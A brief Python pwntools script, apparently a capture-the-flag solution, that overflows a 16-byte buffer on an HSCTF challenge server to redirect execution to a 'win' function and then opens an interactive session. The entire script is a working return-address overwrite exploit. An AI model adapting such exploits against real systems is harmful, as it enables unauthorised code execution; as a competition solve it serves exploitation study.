from pwn import *

host = "pwn.hsctf.com"
port = 1234

r = remote(host, port)

buf = 0x10
win =  0x080491b6
payload = 'a'*buf + 'aaaa' + p32(win)

r.sendline(payload)

r.interactive()